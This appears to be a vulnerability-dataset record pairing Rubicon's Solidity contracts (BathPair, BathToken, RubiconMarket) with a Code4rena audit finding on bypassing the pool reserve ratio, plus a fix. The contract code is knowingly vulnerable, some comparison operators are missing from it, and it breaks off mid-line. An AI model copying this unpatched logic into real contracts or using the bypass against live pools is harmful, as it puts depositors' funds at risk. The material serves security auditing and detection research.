IBathToken(bathQuoteAddress).placeOffer(\n            bid.pay_amt,\n            bid.pay_gem,\n            bid.buy_amt,\n            bid.buy_gem\n        );\n\n        // Strategist trade is recorded so they can get paid and the trade is logged for time\n        StrategistTrade memory outgoing = StrategistTrade(\n            newAskID,\n            ask.pay_amt,\n            _underlyingAsset,\n            newBidID,\n            bid.pay_amt,\n            _underlyingQuote,\n            msg.sender,\n            block.timestamp\n        );\n\n        // Give each trade a unique id for easy handling by strategists\n        id = _next_id();\n        strategistTrades[id] = outgoing;\n        // Allow strategists to easily call a list of their outstanding offers\n        outOffersByStrategist[_underlyingAsset][_underlyingQuote][msg.sender]\n            .push(id);\n\n        emit LogStrategistTrade(\n            id,\n            bytes32(outgoing.askId),\n            bytes32(outgoing.bidId),\n            outgoing.askAsset,\n            outgoing.bidAsset,\n            block.timestamp,\n            outgoing.strategist\n        );\n    }\n\n    /// @notice A function to batch together many placeMarketMakingTrades() in a single transaction\n    function batchMarketMakingTrades(\n        address[2] memory tokenPair, // ASSET, Then Quote\n        uint256[] memory askNumerators, // Quote / Asset\n        uint256[] memory askDenominators, // Asset / Quote\n        uint256[] memory bidNumerators, // size in ASSET\n        uint256[] memory bidDenominators // size in QUOTES\n    ) external onlyApprovedStrategist(msg.sender) {\n        require(\n            askNumerators.length == askDenominators.length &&\n                askDenominators.length == bidNumerators.length &&\n                bidNumerators.length == bidDenominators.length,\n            \"not all order lengths match\"\n        );\n        uint256 quantity = askNumerators.length;\n\n        for (uint256 index = 0; index < quantity; index++) {\n            placeMarketMakingTrades(\n                tokenPair,\n                askNumerators[index],\n                askDenominators[index],\n                bidNumerators[index],\n                bidDenominators[index]\n            );\n        }\n    }\n\n    /// @notice A function to requote an outstanding order and replace it with a new Strategist Trade\n    /// @dev Note that this function will create a new unique id for the requote'd ID due to the low-level functionality\n    function requote(\n        uint256 id,\n        address[2] memory tokenPair, // ASSET, Then Quote\n        uint256 askNumerator, // Quote / Asset\n        uint256 askDenominator, // Asset / Quote\n        uint256 bidNumerator, // size in ASSET\n        uint256 bidDenominator // size in QUOTES\n    ) public onlyApprovedStrategist(msg.sender) {\n        // 1. Scrub strat trade\n        scrubStrategistTrade(id);\n\n        // 2. Place another\n        placeMarketMakingTrades(\n            tokenPair,\n            askNumerator,\n            askDenominator,\n            bidNumerator,\n            bidDenominator\n        );\n    }\n\n    /// @notice A function to batch together many requote() calls in a single transaction\n    /// @dev Ids and input are indexed through to execute requotes\n    function batchRequoteOffers(\n        uint256[] memory ids,\n        address[2] memory tokenPair, // ASSET, Then Quote\n        uint256[] memory askNumerators, // Quote / Asset\n        uint256[] memory askDenominators, // Asset / Quote\n        uint256[] memory bidNumerators, // size in ASSET\n        uint256[] memory bidDenominators // size in QUOTES\n    ) external onlyApprovedStrategist(msg.sender) {\n        require(\n            askNumerators.length == askDenominators.length &&\n                askDenominators.length == bidNumerators.length &&\n                bidNumerators.length == bidDenominators.length &&\n                ids.length == askNumerators.length,\n            \"not all input lengths match\"\n        );\n        uint256 quantity = askNumerators.length;\n\n        for (uint256 index = 0; index < quantity; index++) {\n            requote(\n                ids[index],\n                tokenPair,\n                askNumerators[index],\n                askDenominators[index],\n                bidNumerators[index],\n                bidDenominators[index]\n            );\n        }\n    }\n\n    /// @notice - function to rebalance fill between two pools\n    function rebalancePair(\n        uint256 assetRebalAmt, //amount of ASSET in the quote buffer\n        uint256 quoteRebalAmt, //amount of QUOTE in the asset buffer\n        address _underlyingAsset,\n        address _underlyingQuote\n    ) external onlyApprovedStrategist(msg.sender) {\n        address _bathHouse = bathHouse;\n        address _bathAssetAddress = IBathHouse(_bathHouse).tokenToBathToken(\n            _underlyingAsset\n        );\n        address _bathQuoteAddress = IBathHouse(_bathHouse).tokenToBathToken(\n            _underlyingQuote\n        );\n        require(\n            _bathAssetAddress != address(0) && _bathQuoteAddress != address(0),\n            \"tokenToBathToken error\"\n        );\n\n        // This should be localized to the bathToken in future versions\n        uint16 stratReward = IBathHouse(_bathHouse).getBPSToStrats();\n\n        // Simply rebalance given amounts\n        if (assetRebalAmt > 0) {\n            IBathToken(_bathQuoteAddress).rebalance(\n                _bathAssetAddress,\n                _underlyingAsset,\n                stratReward,\n                assetRebalAmt\n            );\n        }\n        if (quoteRebalAmt > 0) {\n            IBathToken(_bathAssetAddress).rebalance(\n                _bathQuoteAddress,\n                _underlyingQuote,\n                stratReward,\n                quoteRebalAmt\n            );\n        }\n    }\n\n    /// @notice Function to attempt inventory risk tail off on an AMM\n    /// @dev This function calls the strategist utility which handles the trade and returns funds to LPs\n    function tailOff(\n        address targetPool,\n        address tokenToHandle,\n        address targetToken,\n        address _stratUtil, // delegatecall target\n        uint256 amount, //fill amount to handle\n        uint256 hurdle, //must clear this on tail off\n        uint24 _poolFee\n    ) external onlyApprovedStrategist(msg.sender) {\n        // transfer here\n        uint16 stratRewardBPS = IBathHouse(bathHouse).getBPSToStrats();\n\n        IBathToken(targetPool).rebalance(\n            _stratUtil,\n            tokenToHandle,\n            stratRewardBPS,\n            amount\n        );\n\n        // Should always exceed hurdle given amountOutMinimum\n        IStrategistUtility(_stratUtil).UNIdump(\n            amount.sub((stratRewardBPS.mul(amount)).div(10000)),\n            tokenToHandle,\n            targetToken,\n            hurdle,\n            _poolFee,\n            targetPool\n        );\n    }\n\n    /// @notice Cancel an outstanding strategist offers and return funds to LPs while logging fills\n    function scrubStrategistTrade(uint256 id)\n        public\n        onlyApprovedStrategist(msg.sender)\n    {\n        require(\n            msg.sender == strategistTrades[id].strategist,\n            \"you are not the strategist that made this order\"\n        );\n        handleStratOrderAtID(id);\n    }\n\n    /// @notice Batch scrub outstanding strategist trades and return funds to LPs\n    function scrubStrategistTrades(uint256[] memory ids)\n        external\n        onlyApprovedStrategist(msg.sender)\n    {\n        for (uint256 index = 0; index < ids.length; index++) {\n            uint256 _id = ids[index];\n            scrubStrategistTrade(_id);\n        }\n    }\n\n    /// @notice Function where strategists claim rewards proportional to their quantity of fills\n    /// @dev This function should allow a strategist to claim ERC20s sitting on this contract (earned via rebalancing) relative to their share or strategist activity on the pair\n    /// @dev Provide the pair on which you want to claim rewards\n    function strategistBootyClaim(address asset, address quote)\n        external\n        onlyApprovedStrategist(msg.sender)\n    {\n        uint256 fillCountA = strategist2Fills[msg.sender][asset];\n        uint256 fillCountQ = strategist2Fills[msg.sender][quote];\n        if (fillCountA > 0) {\n            uint256 booty = (\n                fillCountA.mul(IERC20(asset).balanceOf(address(this)))\n            ).div(totalFillsPerAsset[asset]);\n            IERC20(asset).transfer(msg.sender, booty);\n            emit LogStrategistRewardClaim(\n                msg.sender,\n                asset,\n                booty,\n                block.timestamp\n            );\n            totalFillsPerAsset[asset] -= fillCountA;\n            strategist2Fills[msg.sender][asset] -= fillCountA;\n        }\n        if (fillCountQ > 0) {\n            uint256 booty = (\n                fillCountQ.mul(IERC20(quote).balanceOf(address(this)))\n            ).div(totalFillsPerAsset[quote]);\n            IERC20(quote).transfer(msg.sender, booty);\n            emit LogStrategistRewardClaim(\n                msg.sender,\n                quote,\n                booty,\n                block.timestamp\n            );\n            totalFillsPerAsset[quote] -= fillCountQ;\n            strategist2Fills[msg.sender][quote] -= fillCountQ;\n        }\n    }\n\n    /// *** View Functions ***\n\n    /// @notice The goal of this function is to enable a means to retrieve all outstanding orders a strategist has live in the books\n    /// @dev This is helpful to manage orders as well as track all strategist orders (like their RAM of StratTrade IDs) and place any would-be constraints on strategists\n    function getOutstandingStrategistTrades(\n        address asset,\n        address quote,\n        address strategist\n    ) public view returns (uint256[] memory) {\n        return outOffersByStrategist[asset][quote][strategist];\n    }\n}\n\n\n",
        "CodeNames": [
            "BathPair.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-08",
                "Location": [
                    "//solidity\nfunction placeMarketMakingTrades(\n    address[2] memory tokenPair, // ASSET, Then Quote\n    uint256 askNumerator, // Quote / Asset\n    uint256 askDenominator, // Asset / Quote\n    uint256 bidNumerator, // size in ASSET\n    uint256 bidDenominator // size in QUOTES\n) public onlyApprovedStrategist(msg.sender) returns (uint256 id) {\n    // Require at least one order is non-zero\n    require(\n        (askNumerator  0 && askDenominator  0) ||\n            (bidNumerator  0 && bidDenominator  0),\n        \"one order must be non-zero\"\n    );\n\n    address _underlyingAsset = tokenPair[0];\n    address _underlyingQuote = tokenPair[1];\n\n    (\n        address bathAssetAddress,\n        address bathQuoteAddress\n    ) = enforceReserveRatio(_underlyingAsset, _underlyingQuote);\n\n    require(\n        bathAssetAddress != address(0) && bathQuoteAddress != address(0),\n        \"tokenToBathToken error\"\n    );\n    .. SNIP..\n    // Place new bid and/or ask\n    // Note: placeOffer returns a zero if an incomplete order\n    uint256 newAskID = IBathToken(bathAssetAddress).placeOffer(\n        ask.pay_amt,\n        ask.pay_gem,\n        ask.buy_amt,\n        ask.buy_gem\n    );\n\n    uint256 newBidID = IBathToken(bathQuoteAddress).placeOffer(\n        bid.pay_amt,\n        bid.pay_gem,\n        bid.buy_amt,\n        bid.buy_gem\n    );\n    .. SNIP..\n}\n",
                    "//solidity\n/// @notice This function enforces that the Bath House reserveRatio (a % of underlying pool liquidity) is enforced across all pools\n/// @dev This function should ensure that reserveRatio % of the underlying liquidity always remains on the Bath Token. Utilization should be 1 reserveRatio in practice assuming strategists use all available liquidity.\nfunction enforceReserveRatio(\n    address underlyingAsset,\n    address underlyingQuote\n)\n    internal\n    view\n    returns (address bathAssetAddress, address bathQuoteAddress)\n{\n    bathAssetAddress = IBathHouse(bathHouse).tokenToBathToken(\n        underlyingAsset\n    );\n    bathQuoteAddress = IBathHouse(bathHouse).tokenToBathToken(\n        underlyingQuote\n    );\n    require(\n        (\n            IBathToken(bathAssetAddress).underlyingBalance().mul(\n                IBathHouse(bathHouse).reserveRatio()\n            )\n        ).div(100) <= IERC20(underlyingAsset).balanceOf(bathAssetAddress),\n        \"Failed to meet asset pool reserve ratio\"\n    );\n    require(\n        (\n            IBathToken(bathQuoteAddress).underlyingBalance().mul(\n                IBathHouse(bathHouse).reserveRatio()\n            )\n        ).div(100) <= IERC20(underlyingQuote).balanceOf(bathQuoteAddress),\n        \"Failed to meet quote pool reserve ratio\"\n    );\n}\n",
                    "//solidity\n..SNIP..\n--------------Order Book ---------------\n[-] asks index 0: ask_pay_amt = 0, ask_buy_amt = 0\n[-] asks index 1: ask_pay_amt = 0, ask_buy_amt = 0\n[-] asks index 2: ask_pay_amt = 0, ask_buy_amt = 0\n[-] asks index 3: ask_pay_amt = 0, ask_buy_amt = 0\n[+] bids index 0: bid_pay_amt = 0, bid_buy_amt = 0\n[+] bids index 1: bid_pay_amt = 0, bid_buy_amt = 0\n[+] bids index 2: bid_pay_amt = 0, bid_buy_amt = 0\n[+] bids index 3: bid_pay_amt = 0, bid_buy_amt = 0\nbathAssetInstance: underlyingBalance() = 1 WETH, balanceOf = 1 WETH, Outstanding Amount = 0 WETH\nbathQuoteInstance: underlyingBalance() = 100 DAI, balanceOf = 100 DAI, Outstanding Amount = 0 DAI\nAfter Placing Order\n--------------Order Book ---------------\n[-] asks index 0: ask_pay_amt = 0.9, ask_buy_amt = 180\n[-] asks index 1: ask_pay_amt = 0, ask_buy_amt = 0\n[-] asks index 2: ask_pay_amt = 0, ask_buy_amt = 0\n[-] asks index 3: ask_pay_amt = 0, ask_buy_amt = 0\n[+] bids index 0: bid_pay_amt = 90, bid_buy_amt = 0.9\n[+] bids index 1: bid_pay_amt = 0, bid_buy_amt = 0\n[+] bids index 2: bid_pay_amt = 0, bid_buy_amt = 0\n[+] bids index 3: bid_pay_amt = 0, bid_buy_amt = 0\nbathAssetInstance: underlyingBalance() = 1 WETH, balanceOf = 0.1 WETH, Outstanding Amount = 0.9 WETH\nbathQuoteInstance: underlyingBalance() = 100 DAI, balanceOf = 10 DAI, Outstanding Amount = 90 DAI\n..SNIP..\n"
                ],
                "Type": " Ineffective ReserveRatio Enforcement",
                "Description": "\n<https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L324\n\n<https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L160\n\n\nPer whitepaper, ReserveRatio ensures that some amount of pool liquidity is present in the contract at all times. This protects the pools from overutilization by strategists and ensures that a portion of the underlying pool assets are liquid so LPs can withdraw. If the ReserveRatio is set to 50, meaning 50% of a liquidity pool\u2019s assets must remain in the pool at all times.\n\nHowever, it was possible for the strategists to bypass the Reserve Ratio restriction and utilize all the funds in the pools, causing the pools to be illiquid.\n\n\nStrategists place their market making trades via the  BathPair.placeMarketMakingTrades function. This function would first check if the pool's reserveRatio is maintained before proceeding. If true, strategists will be allowed to place their market making trades with orders with arbitrary pay amount. Strategists could place ask and bid orders with large pay amount causing large amount of funds to be withdrawn from the pools. The root cause is that at the end of the transaction, there is no additional validation to ensure the pools are not overutilized by strategists and the reserve ratio of the pools is maintained.\n\n<https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L324\n\nsolidity\nfunction placeMarketMakingTrades(\n    address[2] memory tokenPair, // ASSET, Then Quote\n    uint256 askNumerator, // Quote / Asset\n    uint256 askDenominator, // Asset / Quote\n    uint256 bidNumerator, // size in ASSET\n    uint256 bidDenominator // size in QUOTES\n) public onlyApprovedStrategist(msg.sender) returns (uint256 id) {\n    // Require at least one order is non-zero\n    require(\n        (askNumerator  0 && askDenominator  0) ||\n            (bidNumerator  0 && bidDenominator  0),\n        \"one order must be non-zero\"\n    );\n\n    address _underlyingAsset = tokenPair[0];\n    address _underlyingQuote = tokenPair[1];\n\n    (\n        address bathAssetAddress,\n        address bathQuoteAddress\n    ) = enforceReserveRatio(_underlyingAsset, _underlyingQuote);\n\n    require(\n        bathAssetAddress != address(0) && bathQuoteAddress != address(0),\n        \"tokenToBathToken error\"\n    );\n    .. SNIP..\n    // Place new bid and/or ask\n    // Note: placeOffer returns a zero if an incomplete order\n    uint256 newAskID = IBathToken(bathAssetAddress).placeOffer(\n        ask.pay_amt,\n        ask.pay_gem,\n        ask.buy_amt,\n        ask.buy_gem\n    );\n\n    uint256 newBidID = IBathToken(bathQuoteAddress).placeOffer(\n        bid.pay_amt,\n        bid.pay_gem,\n        bid.buy_amt,\n        bid.buy_gem\n    );\n    .. SNIP..\n}\n\n\n<https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L160\n\nsolidity\n/// @notice This function enforces that the Bath House reserveRatio (a % of underlying pool liquidity) is enforced across all pools\n/// @dev This function should ensure that reserveRatio % of the underlying liquidity always remains on the Bath Token. Utilization should be 1 reserveRatio in practice assuming strategists use all available liquidity.\nfunction enforceReserveRatio(\n    address underlyingAsset,\n    address underlyingQuote\n)\n    internal\n    view\n    returns (address bathAssetAddress, address bathQuoteAddress)\n{\n    bathAssetAddress = IBathHouse(bathHouse).tokenToBathToken(\n        underlyingAsset\n    );\n    bathQuoteAddress = IBathHouse(bathHouse).tokenToBathToken(\n        underlyingQuote\n    );\n    require(\n        (\n            IBathToken(bathAssetAddress).underlyingBalance().mul(\n                IBathHouse(bathHouse).reserveRatio()\n            )\n        ).div(100) <= IERC20(underlyingAsset).balanceOf(bathAssetAddress),\n        \"Failed to meet asset pool reserve ratio\"\n    );\n    require(\n        (\n            IBathToken(bathQuoteAddress).underlyingBalance().mul(\n                IBathHouse(bathHouse).reserveRatio()\n            )\n        ).div(100) <= IERC20(underlyingQuote).balanceOf(bathQuoteAddress),\n        \"Failed to meet quote pool reserve ratio\"\n    );\n}\n\n\n\nThe following is the snippet of the test case result. Reserve Ratio is initialized to 80% in this example, which means only 20% of the funds could be utilized by strategists. The BathWETH and BathDAI pools contained 1 WETH and 100 DAI respectively after users deposited their funds into the pools. At the bottom half of the output, it shows that it was possible for the strategists to utilise 90% of the funds in the pools to place an ask and bid order, which exceeded the 20% limit.\n\nThe last two lines of the output show that 90% of the funds in the pools are outstanding.\n\nsolidity\n..SNIP..\n--------------Order Book ---------------\n-] asks index 0: ask_pay_amt = 0, ask_buy_amt = 0\n-] asks index 1: ask_pay_amt = 0, ask_buy_amt = 0\n-] asks index 2: ask_pay_amt = 0, ask_buy_amt = 0\n-] asks index 3: ask_pay_amt = 0, ask_buy_amt = 0\n+] bids index 0: bid_pay_amt = 0, bid_buy_amt = 0\n+] bids index 1: bid_pay_amt = 0, bid_buy_amt = 0\n+] bids index 2: bid_pay_amt = 0, bid_buy_amt = 0\n+] bids index 3: bid_pay_amt = 0, bid_buy_amt = 0\nbathAssetInstance: underlyingBalance() = 1 WETH, balanceOf = 1 WETH, Outstanding Amount = 0 WETH\nbathQuoteInstance: underlyingBalance() = 100 DAI, balanceOf = 100 DAI, Outstanding Amount = 0 DAI\nAfter Placing Order\n--------------Order Book ---------------\n-] asks index 0: ask_pay_amt = 0.9, ask_buy_amt = 180\n-] asks index 1: ask_pay_amt = 0, ask_buy_amt = 0\n-] asks index 2: ask_pay_amt = 0, ask_buy_amt = 0\n-] asks index 3: ask_pay_amt = 0, ask_buy_amt = 0\n+] bids index 0: bid_pay_amt = 90, bid_buy_amt = 0.9\n+] bids index 1: bid_pay_amt = 0, bid_buy_amt = 0\n+] bids index 2: bid_pay_amt = 0, bid_buy_amt = 0\n+] bids index 3: bid_pay_amt = 0, bid_buy_amt = 0\nbathAssetInstance: underlyingBalance() = 1 WETH, balanceOf = 0.1 WETH, Outstanding Amount = 0.9 WETH\nbathQuoteInstance: underlyingBalance() = 100 DAI, balanceOf = 10 DAI, Outstanding Amount = 90 DAI\n..SNIP..\n\n\nTest Script can be found at <https://gist.github.com/xiaoming9090/c4fcd4e967bd7d6940429e5d8e39004d\n\n\nFollowing are the impacts of this issue:\n\n1.  Underlying pool assets are overutilized by strategists, causing the pools to be illiquid. Users might not be able to withdraw their funds from the pools as the pools might not have sufficient underlying assets remained as their assets have been deployed to the Rubicon Market.\n\n2.  Reserve Ratio is one of the key security parameters to safeguard LP's funds so that the amount of losses the pools could potentially incur is limited. Without effective reserve ratio enforcement, strategists could deploy (\"invest\") all the user capital on the Rubicon Market. If the strategist makes a loss from all their orders, the LP would incur significant loss.\n\n",
                "Repair": "\nCheck that the reserveRatio for each of the underlying liquidity pools (asset and quote bathTokens) is observed before and after function execution.\n\nsolidity\nfunction placeMarketMakingTrades(\n    address[2] memory tokenPair, // ASSET, Then Quote\n    uint256 askNumerator, // Quote / Asset\n    uint256 askDenominator, // Asset / Quote\n    uint256 bidNumerator, // size in ASSET\n    uint256 bidDenominator // size in QUOTES\n) public onlyApprovedStrategist(msg.sender) returns (uint256 id) {\n    // Require at least one order is non-zero\n    require(\n        (askNumerator  0 && askDenominator  0) ||\n            (bidNumerator  0 && bidDenominator  0),\n        \"one order must be non-zero\"\n    );\n\n    address _underlyingAsset = tokenPair[0];\n    address _underlyingQuote = tokenPair[1];\n\n    (\n        address bathAssetAddress,\n        address bathQuoteAddress\n    ) = enforceReserveRatio(_underlyingAsset, _underlyingQuote);\n\n    require(\n        bathAssetAddress != address(0) && bathQuoteAddress != address(0),\n        \"tokenToBathToken error\"\n    );\n    .. SNIP..\n    // Place new bid and/or ask\n    // Note: placeOffer returns a zero if an incomplete order\n    uint256 newAskID = IBathToken(bathAssetAddress).placeOffer(\n        ask.pay_amt,\n        ask.pay_gem,\n        ask.buy_amt,\n        ask.buy_gem\n    );\n\n    uint256 newBidID = IBathToken(bathQuoteAddress).placeOffer(\n        bid.pay_amt,\n        bid.pay_gem,\n        bid.buy_amt,\n        bid.buy_gem\n    );\n    .. SNIP..\n\n    // Ensure that the strategist does not overutilize\n    enforceReserveRatio(_underlyingAsset, _underlyingQuote);\n}\n\n\nbghughes (Rubicon) confirmed and commented(https://github.com/code-423n4/2022-05-rubicon-findings/issues/106#issuecomment-1146373406):\n  Good issue! I believe it needs to just be moved to the end of the function. Nice catch and already implemented in practice.\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: BUSL-1.1\n\npragma solidity >=0.7.6;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\ninterface IBathToken is IERC20 {\n    function removeFilledTradeAmount(uint256 amt) external;\n\n    function cancel(uint256 id, uint256 amt) external;\n\n    function placeOffer(\n        uint256 pay_amt,\n        IERC20 pay_gem,\n        uint256 buy_amt,\n        IERC20 buy_gem\n    ) external returns (uint256);\n\n    function rebalance(\n        address destination,\n        address filledAssetToRebalance,\n        uint256 stratTakeProportion,\n        uint256 rebalAmt\n    ) external;\n\n    // Note: commenting out assuming that delegatecalls to the target will suffice, maybe needed for v0 migration ease of upgradeability... trying it out\n    // function initialize(\n    //     IERC20 token,\n    //     address market,\n    //     address _bathHouse,\n    //     address _feeTo\n    // ) external;\n\n    function approveMarket() external;\n\n    function underlyingToken() external returns (IERC20 erc20);\n\n    function bathHouse() external returns (address admin);\n\n    function setBathHouse(address newBathHouse) external;\n\n    function setMarket(address newRubiconMarket) external;\n\n    function setBonusToken(address newBonusToken) external;\n\n    function setFeeBPS(uint256 _feeBPS) external;\n\n    function setFeeTo(address _feeTo) external;\n\n    function RubiconMarketAddress() external returns (address market);\n\n    function outstandingAmount() external returns (uint256 amount);\n\n    function underlyingBalance() external view returns (uint256);\n\n    function deposit(uint256 amount) external returns (uint256 shares);\n\n    function deposit(uint256 assets, address receiver)\n        external\n        returns (uint256 shares);\n\n    function withdraw(uint256 shares) external returns (uint256 amount);\n\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\n\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\n\n    function nonces(address owner) external view returns (uint256);\n\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external;\n}\n\n\n/// SPDX-License-Identifier: Apache-2.0\n/// This contract is a derivative work of the open-source work of Oasis DEX: https://github.com/OasisDEX/oasis\n\n/// @title RubiconMarket.sol\n/// @notice Please see the repository for this code at https://github.com/RubiconDeFi/rubicon-protocol-v1;\n\npragma solidity =0.7.6;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\n/// @notice DSAuth events for authentication schema\ncontract DSAuthEvents {\n    event LogSetAuthority(address indexed authority);\n    event LogSetOwner(address indexed owner);\n}\n\n/// @notice DSAuth library for setting owner of the contract\n/// @dev Provides the auth modifier for authenticated function calls\ncontract DSAuth is DSAuthEvents {\n    address public owner;\n\n    function setOwner(address owner_) external auth {\n        owner = owner_;\n        emit LogSetOwner(owner);\n    }\n\n    modifier auth() {\n        require(isAuthorized(msg.sender), \"ds-auth-unauthorized\");\n        _;\n    }\n\n    function isAuthorized(address src) internal view returns (bool) {\n        if (src == address(this)) {\n            return true;\n        } else if (src == owner) {\n            return true;\n        } else {\n            return false;\n        }\n    }\n}\n\n/// @notice DSMath library for safe math without integer overflow/underflow\ncontract DSMath {\n    function add(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        require((z = x + y) >= x, \"ds-math-add-overflow\");\n    }\n\n    function sub(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        require((z = x - y) <= x, \"ds-math-sub-underflow\");\n    }\n\n    function mul(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        require(y == 0 || (z = x * y) / y == x, \"ds-math-mul-overflow\");\n    }\n\n    function min(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        return x <= y ? x : y;\n    }\n\n    function max(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        return x >= y ? x : y;\n    }\n\n    function imin(int256 x, int256 y) internal pure returns (int256 z) {\n        return x <= y ? x : y;\n    }\n\n    function imax(int256 x, int256 y) internal pure returns (int256 z) {\n        return x >= y ? x : y;\n    }\n\n    uint256 constant WAD = 10**18;\n    uint256 constant RAY = 10**27;\n\n    function wmul(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        z = add(mul(x, y), WAD / 2) / WAD;\n    }\n\n    function rmul(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        z = add(mul(x, y), RAY / 2) / RAY;\n    }\n\n    function wdiv(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        z = add(mul(x, WAD), y / 2) / y;\n    }\n\n    function rdiv(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        z = add(mul(x, RAY), y / 2) / y;\n    }\n}\n\n// /// @notice ERC-20 interface as derived from EIP-20\n// contract ERC20 {\n//     function totalSupply() public view returns (uint256);\n\n//     function balanceOf(address guy) public view returns (uint256);\n\n//     function allowance(address src, address guy) public view returns (uint256);\n\n//     function approve(address guy, uint256 wad) public returns (bool);\n\n//     function transfer(address dst, uint256 wad) public returns (bool);\n\n//     function transferFrom(\n//         address src,\n//         address dst,\n//         uint256 wad\n//     ) public returns (bool);\n// }\n\n/// @notice Events contract for logging trade activity on Rubicon Market\n/// @dev Provides the key event logs that are used in all core functionality of exchanging on the Rubicon Market\ncontract EventfulMarket {\n    event LogItemUpdate(uint256 id);\n    event LogTrade(\n        uint256 pay_amt,\n        address indexed pay_gem,\n        uint256 buy_amt,\n        address indexed buy_gem\n    );\n\n    event LogMake(\n        bytes32 indexed id,\n        bytes32 indexed pair,\n        address indexed maker,\n        ERC20 pay_gem,\n        ERC20 buy_gem,\n        uint128 pay_amt,\n        uint128 buy_amt,\n        uint64 timestamp\n    );\n\n    event LogBump(\n        bytes32 indexed id,\n        bytes32 indexed pair,\n        address indexed maker,\n        ERC20 pay_gem,\n        ERC20 buy_gem,\n        uint128 pay_amt,\n        uint128 buy_amt,\n        uint64 timestamp\n    );\n\n    event LogTake(\n        bytes32 id,\n        bytes32 indexed pair,\n        address indexed maker,\n        ERC20 pay_gem,\n        ERC20 buy_gem,\n        address indexed taker,\n        uint128 take_amt,\n        uint128 give_amt,\n        uint64 timestamp\n    );\n\n    event LogKill(\n        bytes32 indexed id,\n        bytes32 indexed pair,\n        address indexed maker,\n        ERC20 pay_gem,\n        ERC20 buy_gem,\n        uint128 pay_amt,\n        uint128 buy_amt,\n        uint64 timestamp\n    );\n\n    event LogInt(string lol, uint256 input);\n\n    event FeeTake(\n        bytes32 indexed id,\n        bytes32 indexed pair,\n        ERC20 asset,\n        address indexed taker,\n        address feeTo,\n        uint256 feeAmt,\n        uint64 timestamp\n    );\n\n    event OfferDeleted(uint256 id);\n}\n\n/// @notice Core trading logic for ERC-20 pairs, an orderbook, and transacting of tokens\n/// @dev This contract holds the core ERC-20 / ERC-20 offer, buy, and cancel logic\ncontract SimpleMarket is EventfulMarket, DSMath {\n    uint256 public last_offer_id;\n\n    /// @dev The mapping that makes up the core orderbook of the exchange\n    mapping(uint256 => OfferInfo) public offers;\n\n    bool locked;\n\n    /// @dev This parameter is in basis points\n    uint256 internal feeBPS;\n\n    /// @dev This parameter provides the address to which fees are sent\n    address internal feeTo;\n\n    struct OfferInfo {\n        uint256 pay_amt;\n        ERC20 pay_gem;\n        uint256 buy_amt;\n        ERC20 buy_gem;\n        address owner;\n        uint64 timestamp;\n    }\n\n    /// @notice Modifier that insures an order exists and is properly in the orderbook\n    modifier can_buy(uint256 id) virtual {\n        require(isActive(id));\n        _;\n    }\n\n    /// @notice Modifier that checks the user to make sure they own the offer and its valid before they attempt to cancel it\n    modifier can_cancel(uint256 id) virtual {\n        require(isActive(id));\n        require(getOwner(id) == msg.sender);\n        _;\n    }\n\n    modifier can_offer() virtual {\n        _;\n    }\n\n    modifier synchronized() {\n        require(!locked);\n        locked = true;\n        _;\n        locked = false;\n    }\n\n    function isActive(uint256 id) public view returns (bool active) {\n        return offers[id].timestamp > 0;\n    }\n\n    function getOwner(uint256 id) public view returns (address owner) {\n        return offers[id].owner;\n    }\n\n    function getOffer(uint256 id)\n        public\n        view\n        returns (\n            uint256,\n            ERC20,\n            uint256,\n            ERC20\n        )\n    {\n        OfferInfo memory _offer = offers[id];\n        return (_offer.pay_amt, _offer.pay_gem, _offer.buy_amt, _offer.buy_gem);\n    }\n\n    /// @notice Below are the main public entrypoints\n\n    function bump(bytes32 id_) external can_buy(uint256(id_)) {\n        uint256 id = uint256(id_);\n        emit LogBump(\n            id_,\n            keccak256(abi.encodePacked(offers[id].pay_gem, offers[id].buy_gem)),\n            offers[id].owner,\n            offers[id].pay_gem,\n            offers[id].buy_gem,\n            uint128(offers[id].pay_amt),\n            uint128(offers[id].buy_amt),\n            offers[id].timestamp\n        );\n    }\n\n    /// @notice Accept a given `quantity` of an offer. Transfers funds from caller/taker to offer maker, and from market to caller/taker.\n    /// @notice The fee for taker trades is paid in this function.\n    function buy(uint256 id, uint256 quantity)\n        public\n        virtual\n        can_buy(id)\n        synchronized\n        returns (bool)\n    {\n        OfferInfo memory _offer = offers[id];\n        uint256 spend = mul(quantity, _offer.buy_amt) / _offer.pay_amt;\n\n        require(uint128(spend) == spend, \"spend is not an int\");\n        require(uint128(quantity) == quantity, \"quantity is not an int\");\n\n        ///@dev For backwards semantic compatibility.\n        if (\n            quantity == 0 ||\n            spend == 0 ||\n            quantity > _offer.pay_amt ||\n            spend > _offer.buy_amt\n        ) {\n            return false;\n        }\n\n        // Fee logic added on taker trades\n        uint256 fee = mul(spend, feeBPS) / 10000;\n        require(\n            _offer.buy_gem.transferFrom(msg.sender, feeTo, fee),\n            \"Insufficient funds to cover fee\"\n        );\n\n        offers[id].pay_amt = sub(_offer.pay_amt, quantity);\n        offers[id].buy_amt = sub(_offer.buy_amt, spend);\n        require(\n            _offer.buy_gem.transferFrom(msg.sender, _offer.owner, spend),\n            \"_offer.buy_gem.transferFrom(msg.sender, _offer.owner, spend) failed - check that 